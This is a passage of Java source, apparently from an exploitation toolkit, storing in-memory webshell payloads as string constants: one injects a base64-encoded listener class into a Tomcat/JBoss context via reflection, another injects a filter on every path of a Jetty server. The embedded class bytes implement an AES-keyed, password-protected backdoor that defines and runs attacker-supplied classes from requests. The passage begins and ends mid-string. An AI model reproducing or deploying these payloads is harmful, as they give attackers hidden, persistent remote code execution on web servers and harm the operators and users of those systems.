            "                        if (StandardContext != null) {\n" +
            "                            StanderContexts.add(StandardContext);\n" +
            "                            break;\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "        }catch(Exception e){}\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void getContext() {\n" +
            "        Object StandardContext = null;\n" +
            "        try {\n" +
            "            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();\n" +
            "            Thread[] threads = (Thread[]) getFV(threadGroup, \"threads\");\n" +
            "            for (Thread thread : threads) {\n" +
            "                if (thread.getName().contains(\"Acceptor\") && thread.getName().contains(\"http\")) {\n" +
            "                    Object JioEndpoint$ = getFV(thread, \"target\");\n" +
            "                    Object JioEndpointO = getFV(JioEndpoint$, \"this$0\");\n" +
            "                    Object Http11Protocol = getFV(JioEndpointO, \"handler\");\n" +
            "                    Object RequestGroupInof = getFV(Http11Protocol, \"global\");\n" +
            "                    List Processors = (List) getFV(RequestGroupInof, \"processors\");\n" +
            "                    for (int i = 0; i < Processors.size(); i++) {\n" +
            "                        Object RequestInfo = (Object) Processors.get(i);\n" +
            "                        Object Request = getFV(RequestInfo, \"req\");\n" +
            "                        Object Request1 = Request.getClass().getDeclaredMethod(\"getNote\", Integer.TYPE).invoke(Request, 1);\n" +
            "                        Field f4 = Request1.getClass().getDeclaredField(\"context\");\n" +
            "                        f4.setAccessible(true);\n" +
            "                        StandardContext = f4.get(Request1);\n" +
            "                        if (StandardContext != null) {\n" +
            "                            StanderContexts.add(StandardContext);\n" +
            "                            break;\n" +
            "                        }\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMF(Object var1) {\n" +
            "        try {\n" +
            "            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n" +
            "            String ListenerBase64 = \"yv66vgAAADMBWQoAYACyCQBGALMJAEYAtAgAtQkARgC2CAC3CQBGALgIALkJAEYAugcAuwoACgCyCgAKALwKAAoAvQoARgC+CQBGAL8IAMAJAEYAwQoAYADCCgBgAMMIAMQKAMUAxgcAxwoAMQDICgAWAMkKAMUAygoAxQDLBwDMCADNCgDOAM8KADEA0AoAzgDRBwDSCgDOANMKACAA1AoAIADVCgAxANYIANcKAC4A2AgA2QcA2goALgDbBwDcCgDdAN4KADAA3wgA4AcA4QcAeQcA4gcA4wgA5AoALgDlCADmCADnCADoCADpCADqCgDrAOwHAO0KAEYA7ggA7wsAOgDwCADxCgAxAPILADoA8wsAOgD0CgBGAPUKAEYA9ggA9wsA+AD5BwD6CgAuAPsKAEYAwgoARgD8CwD4AP0IAP4LADoA/QcA/woATQCyCgAwAQALAF4BAQoAMQECCgEDAQQKADAAvQoATQEFCgBGAQYKADEBBwgBCAgBCQoAGwEKCABkCgAuAQsKAQwBDQoBDAEOBwEPCABiBwEQBwERAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB1MbWVtc2hlbGwvSkJvc3NMaXN0ZW5lclNoZWxsOwEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABegEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQACW0IBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAR2YXI0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABcwEAAW0BAAFaAQANU3RhY2tNYXBUYWJsZQcA+gcBEgcAzAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAANyZXQHAOMBAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABmJhc2U2NAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNgEAAmJzAQAFdmFsdWUBAApFeGNlcHRpb25zAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBABByZXF1ZXN0RGVzdHJveWVkAQAmKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7KVYBAANyZXEBACNMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50OwEAEnJlcXVlc3RJbml0aWFsaXplZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkHARMHAO0HAQ8HARQBABZnZXRSZXNwb25zZUZyb21SZXF1ZXN0AQBRKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAEdmFyMwEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAR2YXI1AQAEdmFyOAEABHZhcjEBAAR2YXIyAQAKU291cmNlRmlsZQEAF0pCb3NzTGlzdGVuZXJTaGVsbC5qYXZhDABsAG0MAGIAYwwAZABlAQAQM2M2ZTBiOGE5YzE1MjI0YQwAZgBnAQAEcEFTMwwAaABnAQAQL2Zhdmljb25kZW1vLmljbwwAaQBnAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMARUBFgwBFwEYDABqAIcMAGoAZwEABVVURi04DABrAGcMAGwAcwwBGQEaAQADQUVTBwESDAEbARwBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAEdAR4MAGwBHwwBIAEhDAEiASMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEkDAEbASUMASYBJwwBKAEpAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMASoBHgwAbAErDAEXASwMAS0BGAEAEGphdmEudXRpbC5CYXNlNjQMAS4BLwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMATABMQEAE1tMamF2YS9sYW5nL09iamVjdDsHATIMATMBNAwBNQE2AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMATcBOAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyBwETDAE5AToBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0DACoAKkBABBYLVJlcXVlc3RlZC1XaXRoDAE7AIcBAA5YTUxIVFRQUmVxdWVzdAwBPAE9DAE+AT8MAUAAhwwAlQCWDAB6AHsBABBtZW1zaGVsbC5wYXlsb2FkBwEUDAFBAUIBABttZW1zaGVsbC9KQm9zc0xpc3RlbmVyU2hlbGwMAUMBRAwAdgB3DAFFAUYBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0MAUcBSAwBSQFKDAFLAUwHAU0MAU4BTwwBUAEeDACLAIwMAUsBLAEADlhtbEhUVFBSZXF1ZXN0AQAHU3VjY2VzcwwBUQBtDAFSAVMHAVQMAVUBVgwBVwFYAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABFnZXRTZXJ2bGV0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0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\";\n" +
            "            byte[] ListenerClass = base64Decode(ListenerBase64);\n" +
            "\n" +
            "            Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "            defineClass1.setAccessible(true);\n" +
            "\n" +
            "            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);\n" +
            "\n" +
            "            Object listenerObject = (Object) listenerClass.newInstance();\n" +
            "            Method m1 = var1.getClass().getDeclaredMethod(\"getApplicationEventListeners\");\n" +
            "            m1.setAccessible(true);\n" +
            "            Object[] al = (Object[]) m1.invoke(var1);\n" +
            "            Object[] tempArr = new Object[al.length + 1];\n" +
            "            System.arraycopy(al, 0, tempArr, 0, al.length);\n" +
            "            tempArr[al.length] = listenerObject;\n" +
            "            Method m2 = var1.getClass().getDeclaredMethod(\"setApplicationEventListeners\", Object[].class);\n" +
            "            m2.setAccessible(true);\n" +
            "            m2.invoke(var1, new Object[]{tempArr});\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while (var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "}\n";

    public static final String JettyFilterMemShell =
            "import java.lang.reflect.Array;\n" +
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class JettyFilterMemShell {\n" +
            "    private static String CLAZZ_NAME = \"memshell.JettyFilterShell\";\n" +
            "\n" +
            "    public JettyFilterMemShell() {\n" +
            "        Object var1 = getContext();\n" +
            "        if (var1 != null) {\n" +
            "            IMC();\n" +
            "            IMF(var1);\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMF(Object var1) {\n" +
            "        try {\n" +
            "            Class var2 = Thread.currentThread().getContextClassLoader().loadClass(CLAZZ_NAME);\n" +
            "            if (isInjected(var1, var2.getName())) {\n" +
            "                return;\n" +
            "            }\n" +
            "\n" +
            "            Method var3 = var1.getClass().getDeclaredMethod(\"addFilterWithMapping\", Class.class, String.class, Integer.TYPE);\n" +
            "            var3.invoke(var1, var2, \"/*\", 1);\n" +
            "            Field var4 = var1.getClass().getDeclaredField(\"_filterMappings\");\n" +
            "            var4.setAccessible(true);\n" +
            "            Object var5 = var4.get(var1);\n" +
            "            Object[] var6 = new Object[Array.getLength(var5)];\n" +
            "            int var7 = 1;\n" +
            "\n" +
            "            int var8;\n" +
            "            for(var8 = 0; var8 < Array.getLength(var5); ++var8) {\n" +
            "                Object var9 = Array.get(var5, var8);\n" +
            "                Field var10 = var9.getClass().getDeclaredField(\"_filterName\");\n" +
            "                var10.setAccessible(true);\n" +
            "                String var11 = (String)var10.get(var9);\n" +
            "                if (var11.contains(var2.getName())) {\n" +
            "                    var6[0] = var9;\n" +
            "                } else {\n" +
            "                    var6[var7] = var9;\n" +
            "                    ++var7;\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            for(var8 = 0; var8 < var6.length; ++var8) {\n" +
            "                Array.set(var5, var8, var6[var8]);\n" +
            "            }\n" +
            "        } catch (Exception var12) {\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized Object getContext() {\n" +
            "        try {\n" +
            "            Thread var1 = Thread.currentThread();\n" +
            "            Field var2 = Class.forName(\"java.lang.Thread\").getDeclaredField(\"threadLocals\");\n" +
            "            var2.setAccessible(true);\n" +
            "            Object var3 = var2.get(var1);\n" +
            "            Class var4 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap\");\n" +
            "            Field var5 = var4.getDeclaredField(\"table\");\n" +
            "            var5.setAccessible(true);\n" +
            "            Object var6 = var5.get(var3);\n" +
            "            Class var7 = Class.forName(\"java.lang.ThreadLocal$ThreadLocalMap$Entry\");\n" +
            "            Field var8 = var7.getDeclaredField(\"value\");\n" +
            "            var8.setAccessible(true);\n" +
            "            Object var9 = null;\n" +
            "\n" +
            "            for(int var11 = 0; var11 < Array.getLength(var6); ++var11) {\n" +
            "                Object var10 = Array.get(var6, var11);\n" +
            "                if (var10 != null) {\n" +
            "                    var9 = var8.get(var10);\n" +
            "                    if (var9 != null && var9.getClass().getName().equals(\"org.eclipse.jetty.server.HttpConnection\")) {\n" +
            "                        break;\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "\n" +
            "            Class var23 = var9.getClass();\n" +
            "            Object var12 = var23.getMethod(\"getHttpChannel\").invoke(var9);\n" +
            "            Object var13 = var12.getClass().getMethod(\"getRequest\").invoke(var12);\n" +
            "            Object var16 = var13.getClass().getMethod(\"getSession\").invoke(var13);\n" +
            "            Object var17 = var16.getClass().getMethod(\"getServletContext\").invoke(var16);\n" +
            "            Field var18 = var17.getClass().getDeclaredField(\"this$0\");\n" +
            "            var18.setAccessible(true);\n" +
            "            Object var19 = var18.get(var17);\n" +
            "            Field var20 = var19.getClass().getSuperclass().getDeclaredField(\"_servletHandler\");\n" +
            "            var20.setAccessible(true);\n" +
            "            Object var21 = var20.get(var19);\n" +
            "            return var21;\n" +
            "\n" +
            "        } catch (Exception var22) {\n" +
            "        }\n" +
            "\n" +
            "        return null;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(CLAZZ_NAME);\n" +
            "        } catch (Exception var5) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 = base64Decode(\"yv66vgAAADMBhgoAZwDYCQBSANkJAFIA2ggA2wkAUgDcCADdCQBSAN4IAN8JAFIA4AcA4QoACgDYCgAKAOIKAAoA4woAUgDkCQBSAOUIAOYJAFIA5woAZwDoCgBnAOkIAOoKAOsA7AcA7QoAMQDuCgAWAO8KAOsA8AoA6wDxBwDyCADzCgD0APUKADEA9goA9AD3BwD4CgD0APkKACAA+goAIAD7CgAxAPwIAP0KAC4A/ggA/wcAtAoALgEABwC9CgEBAQIKADABAwgBBAcBBQcAgAcBBgcBBwgBCAoALgEJCAEKCAELCAEMCAENCAEOCgAuAQ8HARAKAC4BEQoAOgESCgA/ARMKAD8BFAcBFQoALgEWBwEXCgBBANgKAEEBGAoAQQEZCgBSARoHARsHARwIAR0LAEYBHggBHwoAMQEgCwBGASELAEYBIgoAUgEjCgBSASQIASULASYBJwcBKAoALgEpCgBSAOgKAFIBKgsBJgErCACzCwBGASsHASwKAFkA2AoAMAEtCwBHAS4KADEBLwoBMAExCgAwAOMKAFkBMgoAUgEzCgAxATQIATUIATYLATcBOAoAGwE5BwE6BwE7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAAnhjAQASTGphdmEvbGFuZy9TdHJpbmc7AQADUHdkAQAEcGF0aAEAA21kNQEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABtMbWVtc2hlbGwvSmV0dHlGaWx0ZXJTaGVsbDsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAXoBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAAVEBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAJjYgEAAltCAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAAXMBAAFtAQABWgEADVN0YWNrTWFwVGFibGUHASgHATwHAPIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAHUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQADcmV0BwEHAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjYBAAJicwEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAFZ2V0RlYBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEABHZhcjUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAAW8BAAFmAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABWNsYXp6BwEVBwEFBwEQAQANZ2V0RmllbGRWYWx1ZQEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQADb2JqAQAJZmllbGROYW1lBwE9AQAQZ2V0TWV0aG9kQnlDbGFzcwEAUShMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACm1ldGhvZE5hbWUBAApwYXJhbWV0ZXJzAQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAGaW52b2tlAQBLKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9